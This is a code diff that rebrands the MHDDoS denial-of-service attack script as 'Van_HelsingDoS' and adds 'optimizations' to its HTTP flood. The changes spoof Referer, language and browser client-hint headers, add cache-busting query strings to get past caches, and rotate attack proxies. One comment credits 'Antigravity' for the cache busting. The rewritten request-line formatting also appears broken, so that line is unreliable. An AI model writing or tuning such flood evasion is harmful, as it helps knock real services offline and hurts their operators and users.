@@ -40,7 +40,7 @@ from base64 import b64encode
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
-logger = getLogger("MHDDoS")
+logger = getLogger("Van_HelsingDoS")
 logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
@@ -886,13 +886,34 @@ class HttpFlood(Thread):
                 'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                 'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
             ]
+        
+        # [OPTIMIZED] Referer Spoofing List
+        referers = [
+            'https://www.google.com/',
+            'https://www.bing.com/',
+            'https://www.facebook.com/',
+            'https://twitter.com/',
+            'https://www.instagram.com/',
+            'https://www.youtube.com/',
+            'https://duckduckgo.com/'
+        ]
+        # [OPTIMIZED] Random Languages
+        langs = [
+            'en-US,en;q=0.9',
+            'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
+            'en-GB,en;q=0.9',
+            'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'es-ES,es;q=0.9'
+        ]
+
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
-        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
+        # [OPTIMIZED] Cache Busting by Antigravity
+        sep = "&" if "?" in target.raw_path_qs else "?"
+        rnd = str(randchoice(range(1111, 9999)))
+        self._defaultpayload = "%s %s" + sep + "v=" + rnd + " HTTP/%s\r\n" % (self._req_type, target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
-                         'Accept-Language: en-US,en;q=0.9\r\n'
                          'Cache-Control: max-age=0\r\n'
                          'Connection: keep-alive\r\n'
                          'Sec-Fetch-Dest: document\r\n'
@@ -902,6 +923,11 @@ class HttpFlood(Thread):
                          'Sec-Gpc: 1\r\n'
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
+        self._payload += "Referer: " + randchoice(referers) + "\r\n"
+        self._payload += "Accept-Language: " + randchoice(langs) + "\r\n"
+        self._payload += "Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
+        self._payload += "Sec-Ch-Ua-Mobile: ?0\r\n"
+        self._payload += "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
@@ -934,7 +960,11 @@ class HttpFlood(Thread):
 
     def open_connection(self, host=None) -> socket:
         if self._proxies:
-            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
+            # [OPTIMIZED] Smart Rotation
+            if not hasattr(self, '_proxy_cycle'):
+                from itertools import cycle
+                self._proxy_cycle = cycle(self._proxies)
+            sock = next(self._proxy_cycle).open_socket(AF_INET, SOCK_STREAM)
         else:
             sock = socket(AF_INET, SOCK_STREAM)
 
@@ -1231,7 +1261,7 @@ class HttpFlood(Thread):
                              "Host: %s\r\n" % self._target.authority +
                              self.randHeadercontent +
                              'Accept-Encoding: gzip, deflate, br\r\n'
-                             'Accept-Language: en-US,en;q=0.9\r\n'
+                             
                              'Cache-Control: max-age=0\r\n'
                              'Connection: Keep-Alive\r\n'
                              'Sec-Fetch-Dest: document\r\n'
@@ -1252,7 +1282,7 @@ class HttpFlood(Thread):
                              "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                              self.randHeadercontent +
                              'Accept-Encoding: gzip, deflate, br\r\n'
-                             'Accept-Language: en-US,en;q=0.9\r\n'
+                             
                              'Cache-Control: max-age=0\r\n'
                              'Connection: keep-alive\r\n'
                              'Sec-Fetch-Dest: document\r\n'
@@ -1270,7 +1300,7 @@ class HttpFlood(Thread):
 
     def STOMP(self):
         dep = ('Accept-Encoding: gzip, deflate, br\r\n'
-               'Accept-Language: en-US,en;q=0.9\r\n'
+               
                'Cache-Control: max-age=0\r\n'
                'Connection: keep-alive\r\n'
                'Sec-Fetch-Dest: document\r\n'
@@ -1574,7 +1604,7 @@ class ToolsConsole:
     @staticmethod
     def usage():
         print((
-                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
+                  '* Van_HelsingDoS - DDoS Attack Script With %d Methods\n'
                   'Note: If the Proxy list is empty, The attack will run without proxies\n'
                   '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                   '      Proxy Type 0 = All in config.json\n'
@@ -1730,7 +1760,7 @@ if __name__ == '__main__':
                             or bombardier_path.with_suffix('.exe').exists()
                     ), (
                         "Install bombardier: "
-                        "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
+                        "https://github.com/raynaldoanantawijaya/Van_HelsingDoS/wiki/BOMB-method"
                     )
 
                 if len(argv) == 9:
@@ -1780,7 +1810,7 @@ if __name__ == '__main__':
 
                 if method in Methods.LAYER4_AMP:
                     logger.warning("this method need spoofable servers please check")
-                    logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")
+                    logger.warning("https://github.com/raynaldoanantawijaya/Van_HelsingDoS/wiki/Amplification-ddos-attack")
 
                 threads = int(argv[3])
                 timer = int(argv[4])
@@ -1811,7 +1841,11 @@ if __name__ == '__main__':
                             if len(argv) == 8:
                                 logger.setLevel("DEBUG")
                             proxy_ty = int(argfive)
-                            proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
+                            # [OPTIMIZED] Flexible Path
+                            user_path = argv[6].strip()
+                            proxy_li = Path(user_path)
+                            if not proxy_li.exists():
+                                proxy_li = Path(__dir__ / "files/proxies" / user_path)
                             proxies = handleProxyList(con, proxy_li, proxy_ty)
                             if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                 exit("this method cannot use for layer4 proxy")
